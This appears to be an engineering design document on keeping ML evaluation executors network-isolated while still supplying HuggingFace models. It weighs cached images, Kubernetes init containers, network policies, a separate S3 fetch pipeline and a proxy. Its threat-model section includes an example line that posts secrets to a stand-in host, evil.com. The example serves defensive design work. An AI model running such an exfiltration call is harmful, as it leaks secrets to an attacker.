# ML Model Security Considerations

## The Challenge

ML evaluations need to download models (often 100MB-10GB) from HuggingFace or other model hubs, but we enforce `network_mode="none"` for security to prevent:
- Data exfiltration by malicious code
- Downloading of malicious payloads
- Communication with command & control servers

## Core Security Principle: Separate Download from Execution

**The fundamental solution is to separate model downloading (requires network) from model execution (requires isolation):**

```
┌─────────────────────┐         ┌─────────────────────┐
│   Download Phase    │         │  Execution Phase    │
│                     │         │                     │
│ ✓ Network access    │ ──────> │ ✗ No network       │
│ ✓ Write to cache   │ Models  │ ✓ Read from cache  │
│ ✗ No user code     │         │ ✓ Run user code    │
│ ✓ Trusted process  │         │ ✗ Untrusted code   │
└─────────────────────┘         └─────────────────────┘
```

This separation ensures:
1. **Models are downloaded safely** by trusted code with network access
2. **User code executes in isolation** without network access
3. **No possibility of data exfiltration** during execution
4. **Models can be validated/scanned** during download phase

## Current State

The executor containers run with no network access, causing ML evaluations to fail with:
```
OSError: We couldn't connect to 'https://huggingface.co' to load this file
```

This is by design - we just haven't implemented the separate download phase yet.

## Potential Solutions

### Option 1: Pre-cached Models in Image (Recommended for v1)

**Implementation:**
```dockerfile
# executor-ml/Dockerfile
# Pre-download common models
RUN python -c "
from transformers import AutoModel, AutoTokenizer
models = ['distilgpt2', 'bert-base-uncased', 'gpt2', 'distilbert-base-uncased']
for model in models:
    AutoModel.from_pretrained(model)
    AutoTokenizer.from_pretrained(model)
"
```

**Pros:**
- Maintains complete network isolation
- Fast execution (no download time)
- Predictable behavior

**Cons:**
- Large image size (1-5GB per model)
- Limited to pre-selected models
- Requires rebuild for new models

### Option 2: Shared Model Cache with Init Container (Recommended for K8s)

**Kubernetes Implementation:**
```yaml
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: model-cache
spec:
  accessModes:
    - ReadWriteMany
  resources:
    requests:
      storage: 100Gi

---
apiVersion: batch/v1
kind: Job
metadata:
  name: model-downloader
spec:
  template:
    spec:
      initContainers:
      - name: download-models
        image: model-downloader
        # This container HAS network access
        command: ["python", "download_models.py"]
        volumeMounts:
        - name: model-cache
          mountPath: /models
      containers:
      - name: executor
        image: executor-ml
        # This container has NO network access
        securityContext:
          allowPrivilegeEscalation: false
          capabilities:
            drop:
            - ALL
        volumeMounts:
        - name: model-cache
          mountPath: /models
          readOnly: true
        env:
        - name: TRANSFORMERS_CACHE
          value: /models
        - name: TRANSFORMERS_OFFLINE
          value: "1"
```

**Pros:**
- Separation of download and execution
- Shared cache across all evaluations
- Can add new models without rebuilding
- Models verified during download phase

**Cons:**
- Requires persistent volume management
- First evaluation of new model is slower
- More complex architecture

### Option 3: Network Policy Restrictions (Less Secure)

**Kubernetes NetworkPolicy:**
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-huggingface-only
spec:
  podSelector:
    matchLabels:
      app: executor
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: TCP
      port: 443
  - to:
    # Only allow specific IPs (HuggingFace CDN)
    - ipBlock:
        cidr: 185.199.108.0/22  # GitHub/HF CDN
    - ipBlock:
        cidr: 140.82.112.0/20   # GitHub/HF CDN
    ports:
    - protocol: TCP
      port: 443
```

**Pros:**
- Access to all models
- No pre-downloading needed
- Flexible for research

**Cons:**
- Opens network attack vector
- IP addresses can change
- DNS resolution complexities
- Potential for bypasses

### Option 4: Physically Separate Model Pipeline (Most Secure)

**Architecture:**
```
┌─────────────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│  Model Fetch Service    │────▶│  HuggingFace    │     │   Evaluation    │
│  (Separate VPC/Account) │     │      CDN         │     │      VPC        │
│                         │     └──────────────────┘     │                 │
│ • Scheduled/triggered   │                              │ • No internet   │
│ • Validates models      │     ┌──────────────────┐     │ • Read S3 only  │
│ • Scans for malware     │────▶│   S3 Bucket      │◀────│ • Run user code │
│ • Signs models          │     │  (Model Cache)   │     │                 │
└─────────────────────────┘     └──────────────────┘     └─────────────────┘
         Internet Access                VPC Endpoint              No Internet
```

**Implementation:**
```yaml
# Separate AWS Account/VPC for model downloading
ModelFetchService:
  Type: AWS::Lambda::Function
  Properties:
    Runtime: python3.11
    Timeout: 900  # 15 minutes for large models
    Environment:
      ALLOWED_MODELS: "gpt2,bert-base,distilgpt2"
      TARGET_BUCKET: "s3://my-secure-model-cache"
    VpcConfig:
      SecurityGroupIds:
        - !Ref ModelFetchSecurityGroup  # Allows HuggingFace only

# Evaluation VPC - No Internet Gateway
EvaluationVPC:
  Type: AWS::EC2::VPC
  Properties:
    EnableDnsSupport: true
    EnableDnsHostnames: true
    # NO Internet Gateway attached

# S3 VPC Endpoint for model access
S3Endpoint:
  Type: AWS::EC2::VPCEndpoint
  Properties:
    VpcId: !Ref EvaluationVPC
    ServiceName: com.amazonaws.region.s3
    VpcEndpointType: Gateway
```

**Security Benefits:**
- Complete physical isolation between download and execution
- Model fetching happens in different AWS account/VPC
- No possibility of network access during evaluation
- Models can be thoroughly validated before use
- S3 provides versioning and access logs

**Workflow:**
1. Admin triggers model download (or scheduled)
2. Model fetch service (with internet) downloads from HuggingFace
3. Service validates model integrity and scans for threats
4. Service uploads to S3 with metadata and signatures
5. Evaluation containers fetch from S3 via VPC endpoint (no internet)

### Option 5: Proxy-Based Model Fetching (Complex but Flexible)

**Architecture:**
```
┌─────────────────┐     ┌──────────────────┐     ┌────────────────┐
│    Executor     │────▶│   Model Proxy    │────▶│  HuggingFace  │
│  (no network)   │     │ (authenticates,  │     │      CDN      │
│                 │     │  validates,      │     │               │
│                 │     │  caches)         │     │               │
└─────────────────┘     └──────────────────┘     └────────────────┘
         │                        │
         └────────────────────────┘
           Unix socket or       
           named pipe          
```

**Implementation:**
- Executor communicates with proxy via unix socket (no network)
- Proxy validates model requests
- Proxy maintains allowlist of safe models
- Proxy scans downloaded files
- Proxy serves models to executor

**Pros:**
- Maintains security boundary
- Flexible model access
- Can add security scanning
- Audit trail of model usage

**Cons:**
- Complex implementation
- Another service to maintain
- Potential bottleneck

## Recommendation

### Phase 1 (Current Docker Compose)
- Document the network limitation
- For demos, temporarily allow network access with warning
- Or pre-build executor-ml with specific models

### Phase 2 (Initial Kubernetes)
- Implement Option 2 (Shared cache with init containers)
- Use Kubernetes PersistentVolumes for model storage
- Separate download and execution privileges

### Phase 3 (Production Security)
- Implement Option 4 (Physically separate model pipeline)
- Separate VPC/Account for model downloading
- S3 bucket as secure model cache
- VPC endpoints for S3 access (no internet gateway)
- Model validation and signing process

## Why Physical Separation is Superior

Your intuition about physical separation is correct for several reasons:

1. **Attack Surface Reduction**: Even with init containers, they share the same node/network as execution. Physical separation eliminates this.

2. **Defense in Depth**: Multiple AWS account boundaries, VPC isolation, and IAM policies create layers of security.

3. **Audit and Compliance**: Clear separation makes it easier to demonstrate security controls to auditors.

4. **Operational Benefits**:
   - Model downloads don't impact evaluation performance
   - Can scan/validate models without time pressure
   - Can pre-stage models before they're needed
   - S3 provides built-in versioning and access logs

5. **Failure Isolation**: If model download service is compromised, evaluation environment remains secure.

## Example S3-Based Implementation

```python
# Model Fetch Service (separate Lambda/EC2)
def fetch_and_validate_model(model_name: str):
    # Download with full network access
    model = AutoModel.from_pretrained(model_name)
    tokenizer = AutoTokenizer.from_pretrained(model_name)
    
    # Validate
    if not validate_model_safety(model):
        raise SecurityError(f"Model {model_name} failed security validation")
    
    # Package and upload to S3
    with tempfile.TemporaryDirectory() as tmpdir:
        model.save_pretrained(tmpdir)
        tokenizer.save_pretrained(tmpdir)
        
        # Add metadata
        metadata = {
            "downloaded_at": datetime.now().isoformat(),
            "source": "huggingface",
            "validated": True,
            "checksum": calculate_checksum(tmpdir)
        }
        
        # Upload to S3
        s3.upload_directory(tmpdir, f"s3://model-cache/{model_name}/")
        s3.put_object(f"s3://model-cache/{model_name}/metadata.json", metadata)

# Evaluation Environment (no internet)
def load_model_from_s3(model_name: str):
    # Download from S3 via VPC endpoint (no internet required)
    with tempfile.TemporaryDirectory() as tmpdir:
        s3.download_directory(f"s3://model-cache/{model_name}/", tmpdir)
        
        # Verify integrity
        metadata = json.load(open(f"{tmpdir}/metadata.json"))
        if not verify_checksum(tmpdir, metadata["checksum"]):
            raise SecurityError("Model integrity check failed")
        
        # Load model
        model = AutoModel.from_pretrained(tmpdir, local_files_only=True)
        return model
```

## Security Principles

1. **Separation of Privileges**: Downloading (with network) and execution (without network) must be separate phases
2. **Least Privilege**: Execution environment should have minimal capabilities
3. **Defense in Depth**: Multiple layers of security
4. **Temporal Isolation**: Network access and code execution never happen at the same time
5. **Validation**: All models should be validated before use
6. **Audit Trail**: Track what models are used by whom

## Why This Separation Matters

Consider the attack scenarios we prevent:

### Without Separation (Dangerous)
```python
# Malicious user code during evaluation
import transformers
import requests

# Download "model" (actually malware)
model = transformers.AutoModel.from_pretrained("evil-model")
# Exfiltrate data
requests.post("https://evil.com", data={"secrets": read_secrets()})
```

### With Separation (Safe)
```python
# Download Phase (trusted code only)
# - Downloads legitimate models
# - Validates checksums
# - Scans for malware
# - No user code execution

# Execution Phase (user code, but no network)
import transformers
# This works - model already in cache
model = transformers.AutoModel.from_pretrained("gpt2")
# This fails - no network access
requests.post("https://evil.com", ...)  # ConnectionError
```

## Temporary Workaround

For development/demos, add environment variable to toggle network:
```python
# executor-service/app.py
network_mode = "bridge" if os.getenv("ALLOW_NETWORK", "false").lower() == "true" else "none"
```

Then in docker-compose.override.yml:
```yaml
executor-1:
  environment:
    - ALLOW_NETWORK=true  # SECURITY WARNING: Only for demos!
```

## Future Considerations

1. **Model Signing**: Verify model authenticity
2. **Model Scanning**: Check for malicious patterns
3. **Resource Limits**: Prevent large model DoS
4. **Caching Strategy**: LRU cache for popular models
5. **Monitoring**: Track model usage patterns